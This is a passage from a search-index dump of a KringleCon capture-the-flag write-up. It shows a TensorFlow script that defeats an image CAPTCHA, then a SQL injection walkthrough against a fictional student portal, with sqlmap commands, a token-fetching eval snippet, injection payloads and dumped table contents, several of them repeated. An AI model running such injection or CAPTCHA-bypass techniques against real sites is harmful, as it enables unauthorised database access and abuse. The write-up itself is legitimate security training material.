argsort ()[ - 5 :][:: - 1 ][ 0 ] q . put ( { 'img_full_path' : img_full_path , 'prediction' : labels [ prediction ] . title (), 'percent' : results [ prediction ]} ) def load_graph ( model_file ): graph = tf . Graph () graph_def = tf . GraphDef () with open ( model_file , \"rb\" ) as f : graph_def . ParseFromString ( f . read ()) with graph . as_default (): tf . import_graph_def ( graph_def ) return graph def read_tensor_from_image_bytes ( imagebytes , input_height = 299 , input_width = 299 , input_mean = 0 , input_std = 255 ): image_reader = tf . image . decode_png ( imagebytes , channels = 3 , name = \"png_reader\" ) float_caster = tf . cast ( image_reader , tf . float32 ) dims_expander = tf . expand_dims ( float_caster , 0 ) resized = tf . image . resize_bilinear ( dims_expander , [ input_height , input_width ]) normalized = tf . divide ( tf . subtract ( resized , [ input_mean ]), [ input_std ]) sess = tf . compat . v1 . Session () result = sess . run ( normalized ) return result def main ( unknown_images , types ): # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory graph = load_graph ( '/tmp/retrain_tmp/output_graph.pb' ) labels = load_labels ( \"/tmp/retrain_tmp/output_labels.txt\" ) # Load up our session input_operation = graph . get_operation_by_name ( \"import/Placeholder\" ) output_operation = graph . get_operation_by_name ( \"import/final_result\" ) sess = tf . compat . v1 . Session ( graph = graph ) # Can use queues and threading to spead up the processing q = queue . Queue () #Going to interate over each of our images. for image in unknown_images : img_full_path = image [ 'uuid' ] print ( 'Processing Image {} ' . format ( img_full_path )) # We don't want to process too many images at once. 10 threads max while len ( threading . enumerate ()) > 10 : time . sleep ( 0.0001 ) #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object image_bytes = base64 . b64decode ( image [ 'base64' ]) threading . Thread ( target = predict_image , args = ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation )) . start () print ( 'Waiting For Threads to Finish...' ) while q . qsize () < len ( unknown_images ): time . sleep ( 0.001 ) #getting a list of all threads returned results prediction_results = [ q . get () for x in range ( q . qsize ())] #create list of our uuids matching the types uuids_list = [] for prediction in prediction_results : print ( 'TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy' . format ( ** prediction )) if prediction [ 'prediction' ] in types : uuids_list . append ( prediction [ 'img_full_path' ]) return uuids_list if __name__ == \"__main__\" : main () Let's run and win! python3 capteha_api.py And you get the winning message: Congratulations and Happy Holidays! Entries for email address YourRealEmail@SomeRealEmailDomain.RealTLD no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. Congratulations and Happy Holidays! Check you email for an email from contest@fridosleigh.com to get the wining code: Winning code To receive your reward, simply attend KringleCon at Elf University and submit the following code in your badge: 8Ia8LiZEwvyZr2WO Congratulations! You have completed the Bypassing the Frido Sleigh CAPTEHA challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld You did it! Thank you so much. I can trust you! To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels. As for those scraps of paper, I scanned those and put the images on my server. I then threw the paper away. Unfortunately, I managed to lock out my account on the server. Hey! You\u2019ve got some great skills. Would you please hack into my system and retrieve the scans? I give you permission to hack into it, solving Objective 9 in your badge. And, as long as you're traveling around, be sure to solve any other challenges you happen across. Now we can use steam tunnels fo teleportation!","title":"Predicting Images from CAPTEHA  :"},{"location":"objectives/objective8/#what-youve-learned","text":"Image Recognition Using TensorFlow Machine Learning. Interacting with api and understand dataflow to be able to manipulate the result.","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective9/","text":"9. Retrieve Scraps of Paper from Server \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83d\udcdc Info & Hints \u00b6 Retrieve Scraps of Paper from Server Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Pepper Minstix That's it - hooray! Have you had any luck retrieving scraps of paper from the Elf U server? You might want to look into SQL injection techniques. OWASP is always a good resource for web attacks. For blind SQLi, I've heard Sqlmap is a great tool. In certain circumstances though, you need custom tamper scripts to get things going! SQL Injection SQL Injection from OWASP SQLMap Tamper Scripts Sqlmap Tamper Scripts What is the name of Santa's cutting-edge sleigh guidance system? \u26a1\ufe0f Solution \u00b6 Understand the backend: \u00b6 When you visit the student portal, you will find two forms one for submitting an application and other for query the application status : Let's go with (Check Application Status]( https://studentportal.elfu.org/check.php ) page to check the database: The form send Get request to https://studentportal.elfu.org/application-check.php with the email and token : If we checked the check.php page source code we can see that the token is hidden value in the form and filled by javascript getting data from validator.php < input type = \"hidden\" id = \"token\" name = \"token\" value = \"\" /> function submitApplication () { console . log ( \"Submitting\" ); elfSign (); document . getElementById ( \"check\" ). submit (); } function elfSign () { var s = document . getElementById ( \"token\" ); const Http = new XMLHttpRequest (); const url = '/validator.php' ; Http . open ( \"GET\" , url , false ); Http . send ( null ); if ( Http . status === 200 ) { console . log ( Http . responseText ); s . value = Http . responseText ; } } Visit validator.php and try to refesh for 3-4 times. Each visit you will get new token which indicate it's time based token/one time use token. MTAxMDMyNTA4NTQ0MTU3ODYzMjk0NjEwMTAzMjUwOC41NDQ=_MTI5MzIxNjEwOTM2MzIzMjMzMDQwMjczLjQwOA== MTAxMDMyNTA3NjQ4MTU3ODYzMjkzMjEwMTAzMjUwNy42NDg=_MTI5MzIxNjA5Nzg5NDQzMjMzMDQwMjQ0LjczNg== MTAxMDMyNTA3OTY4MTU3ODYzMjkzNzEwMTAzMjUwNy45Njg=_MTI5MzIxNjEwMTk5MDQzMjMzMDQwMjU0Ljk3Ng== SQL Injection \u00b6 Let's try to inject the query to compromise the database: send ' as an email input to check the error we are getting from the database. ERROR Error: SELECT status FROM applications WHERE elfmail = '''; You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 We get valuable information: application table , MariaDB database dbms. Let's use Sqlmap tool to automate the injection and retrive the data. Download the tool link or using git command. git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev We need to get the token, so we will use small python code with --eval option in sqlmap the script will make a GET request to validator.php retrieve the token and store it in a variable token to be used by sqlmap import requests r = requests . get ( 'https://studentportal.elfu.org/validator.php' ) token = r . text ; You will need to insall requests package: pip3 install requests sqlmap commands : Let's start by testing the databases for injection: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" -v 4 -u the page communicating with targeted database. -p Testable parameter . --dbms=MariaDB set dbms type. --eval=EVALCODE Evaluate provided Python code before the request. -v set the verbosity level of output messages. sqlmap identified the following injection point ( s ) with a total of 67 HTTP ( s ) requests: --- Parameter: elfmail ( GET ) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: elfmail = 1 ' AND 1817=1817 AND ' VsQU '=' VsQU & token = 1 Vector: AND [ INFERENCE ] Type: error-based Title: MySQL > = 5 .0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause ( FLOOR ) Payload: elfmail = 1 ' AND (SELECT 6257 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(6257=6257,1))),0x716a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ' kcsP '=' kcsP & token = 1 Vector: AND ( SELECT [ RANDNUM ] FROM ( SELECT COUNT ( * ) ,CONCAT ( '[DELIMITER_START]' , ([ QUERY ]) , '[DELIMITER_STOP]' ,FLOOR ( RAND ( 0 ) *2 )) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x ) a ) Type: time-based blind Title: MySQL > = 5 .0.12 AND time-based blind ( query SLEEP ) Payload: elfmail = 1 ' AND (SELECT 2136 FROM (SELECT(SLEEP(5)))DMUR) AND ' eZch '=' eZch & token = 1 Vector: AND ( SELECT [ RANDNUM ] FROM ( SELECT ( SLEEP ([ SLEEPTIME ] - ( IF ([ INFERENCE ] ,0, [ SLEEPTIME ])))))[ RANDSTR ]) --- Now let's try to get the databases: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" --dbs -v 4 --dbs Enumerate DBMS databases available databases [2]: [*] elfu [*] information_schema Get elfu database tables: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" --tables -v 4 -D elfu --tables Enumerate DBMS database tables -D DB DBMS database to enumerate Database: elfu [3 tables] +--------------+ | applications | | krampus | | students | +--------------+ The tables looks interesting. let's focus on students , krampus because applications table will be filled with all testing queries everyone did! Dumping students & krampus tables: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" -v 4 -D elfu -T \"krampus,students\" --dump -T DBMS database table(s) to enumerate --dump Dump DBMS database table entries Database: elfu Table: krampus [6 entries] +----+-----------------------+ | id | path | +----+-----------------------+ | 1 | /krampus/0f5f510e.png | | 2 | /krampus/1cc7e121.png | | 3 | /krampus/439f15e6.png | | 4 | /krampus/667d6896.png | | 5 | /krampus/adb798ca.png | | 6 | /krampus/ba417715.png | +----+-----------------------+ Also the result saved in csv files in folder at home directory .sqlmap/output/studentportal.elfu.org Alternative method We can test injection and dump the all tables with one command but it will take longer time: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" --dump Retrieve the paper scraps : \u00b6 Using the data we retrieved from krampus table we now can get all scraps which we know from the objective it's hosted at the student portal https://studentportal.elfu.org/krampus/0f5f510e.png https://studentportal.elfu.org/krampus/1cc7e121.png https://studentportal.elfu.org/krampus/439f15e6.png https://studentportal.elfu.org/krampus/667d6896.png https://studentportal.elfu.org/krampus/adb798ca.png https://studentportal.elfu.org/krampus/ba417715.png The name of Santa's cutting-edge sleigh guidance system super sled-o-matic Congratulations! You have completed the Retrieve Scraps of Paper from Server challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Using sql injection to get errors that expose information about the database. Automating Sql injection using sqlmap. Evaluate python code in sqlmap command.","title":"9 Retrieve Scraps of Paper from Server"},{"location":"objectives/objective9/#9-retrieve-scraps-of-paper-from-server","text":"Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"9. Retrieve Scraps of Paper from Server"},{"location":"objectives/objective9/#info-hints","text":"Retrieve Scraps of Paper from Server Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Pepper Minstix That's it - hooray! Have you had any luck retrieving scraps of paper from the Elf U server? You might want to look into SQL injection techniques. OWASP is always a good resource for web attacks. For blind SQLi, I've heard Sqlmap is a great tool. In certain circumstances though, you need custom tamper scripts to get things going! SQL Injection SQL Injection from OWASP SQLMap Tamper Scripts Sqlmap Tamper Scripts What is the name of Santa's cutting-edge sleigh guidance system?","title":"\ud83d\udcdc Info &amp; Hints"},{"location":"objectives/objective9/#solution","text":"","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective9/#understand-the-backend","text":"When you visit the student portal, you will find two forms one for submitting an application and other for query the application status : Let's go with (Check Application Status]( https://studentportal.elfu.org/check.php ) page to check the database: The form send Get request to https://studentportal.elfu.org/application-check.php with the email and token : If we checked the check.php page source code we can see that the token is hidden value in the form and filled by javascript getting data from validator.php < input type = \"hidden\" id = \"token\" name = \"token\" value = \"\" /> function submitApplication () { console . log ( \"Submitting\" ); elfSign (); document . getElementById ( \"check\" ). submit (); } function elfSign () { var s = document . getElementById ( \"token\" ); const Http = new XMLHttpRequest (); const url = '/validator.php' ; Http . open ( \"GET\" , url , false ); Http . send ( null ); if ( Http . status === 200 ) { console . log ( Http . responseText ); s . value = Http . responseText ; } } Visit validator.php and try to refesh for 3-4 times. Each visit you will get new token which indicate it's time based token/one time use token. MTAxMDMyNTA4NTQ0MTU3ODYzMjk0NjEwMTAzMjUwOC41NDQ=_MTI5MzIxNjEwOTM2MzIzMjMzMDQwMjczLjQwOA== MTAxMDMyNTA3NjQ4MTU3ODYzMjkzMjEwMTAzMjUwNy42NDg=_MTI5MzIxNjA5Nzg5NDQzMjMzMDQwMjQ0LjczNg== MTAxMDMyNTA3OTY4MTU3ODYzMjkzNzEwMTAzMjUwNy45Njg=_MTI5MzIxNjEwMTk5MDQzMjMzMDQwMjU0Ljk3Ng==","title":"Understand the backend:"},{"location":"objectives/objective9/#sql-injection","text":"Let's try to inject the query to compromise the database: send ' as an email input to check the error we are getting from the database. ERROR Error: SELECT status FROM applications WHERE elfmail = '''; You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 We get valuable information: application table , MariaDB database dbms. Let's use Sqlmap tool to automate the injection and retrive the data. Download the tool link or using git command. git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev We need to get the token, so we will use small python code with --eval option in sqlmap the script will make a GET request to validator.php retrieve the token and store it in a variable token to be used by sqlmap import requests r = requests . get ( 'https://studentportal.elfu.org/validator.php' ) token = r . text ; You will need to insall requests package: pip3 install requests sqlmap commands : Let's start by testing the databases for injection: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" -v 4 -u the page communicating with targeted database. -p Testable parameter . --dbms=MariaDB set dbms type. --eval=EVALCODE Evaluate provided Python code before the request. -v set the verbosity level of output messages. sqlmap identified the following injection point ( s ) with a total of 67 HTTP ( s ) requests: --- Parameter: elfmail ( GET ) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: elfmail = 1 ' AND 1817=1817 AND ' VsQU '=' VsQU & token = 1 Vector: AND [ INFERENCE ] Type: error-based Title: MySQL > = 5 .0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause ( FLOOR ) Payload: elfmail = 1 ' AND (SELECT 6257 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(6257=6257,1))),0x716a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ' kcsP '=' kcsP & token = 1 Vector: AND ( SELECT [ RANDNUM ] FROM ( SELECT COUNT ( * ) ,CONCAT ( '[DELIMITER_START]' , ([ QUERY ]) , '[DELIMITER_STOP]' ,FLOOR ( RAND ( 0 ) *2 )) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x ) a ) Type: time-based blind Title: MySQL > = 5 .0.12 AND time-based blind ( query SLEEP ) Payload: elfmail = 1 ' AND (SELECT 2136 FROM (SELECT(SLEEP(5)))DMUR) AND ' eZch '=' eZch & token = 1 Vector: AND ( SELECT [ RANDNUM ] FROM ( SELECT ( SLEEP ([ SLEEPTIME ] - ( IF ([ INFERENCE ] ,0, [ SLEEPTIME ])))))[ RANDSTR ]) --- Now let's try to get the databases: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" --dbs -v 4 --dbs Enumerate DBMS databases available databases [2]: [*] elfu [*] information_schema Get elfu database tables: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" --tables -v 4 -D elfu --tables Enumerate DBMS database tables -D DB DBMS database to enumerate Database: elfu [3 tables] +--------------+ | applications | | krampus | | students | +--------------+ The tables looks interesting. let's focus on students , krampus because applications table will be filled with all testing queries everyone did! Dumping students & krampus tables: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" -v 4 -D elfu -T \"krampus,students\" --dump -T DBMS database table(s) to enumerate --dump Dump DBMS database table entries Database: elfu Table: krampus [6 entries] +----+-----------------------+ | id | path | +----+-----------------------+ | 1 | /krampus/0f5f510e.png | | 2 | /krampus/1cc7e121.png | | 3 | /krampus/439f15e6.png | | 4 | /krampus/667d6896.png | | 5 | /krampus/adb798ca.png | | 6 | /krampus/ba417715.png | +----+-----------------------+ Also the result saved in csv files in folder at home directory .sqlmap/output/studentportal.elfu.org Alternative method We can test injection and dump the all tables with one command but it will take longer time: python3 sqlmap.py -u \"https://studentportal.elfu.org/application-check.php?elfmail=1&token=1\" -p elfmail --dbms = MariaDB --eval = \"import requests; r = requests.get('https://studentportal.elfu.org/validator.php');token = r.text;\" --dump","title":"SQL Injection"},{"location":"objectives/objective9/#retrieve-the-paper-scraps","text":"Using the data we retrieved from krampus table we now can get all scraps which we know from the objective it's hosted at the student portal https://studentportal.elfu.org/krampus/0f5f510e.png https://studentportal.elfu.org/krampus/1cc7e121.png https://studentportal.elfu.org/krampus/439f15e6.png https://studentportal.elfu.org/krampus/667d6896.png https://studentportal.elfu.org/krampus/adb798ca.png https://studentportal.elfu.org/krampus/ba417715.png The name of Santa's cutting-edge sleigh guidance system super sled-o-matic Congratulations! You have completed the Retrieve Scraps of Paper from Server challenge! \ud83c\udf89","title":"Retrieve the paper scraps :"},{"location":"objectives/objective9/#what-youve-learned","text":"Using sql injection to get errors that expose information about the database. Automating Sql injection using sqlmap. Evaluate python code in sqlmap command.","title":"\ud83c\udf93 What you've learned"}]}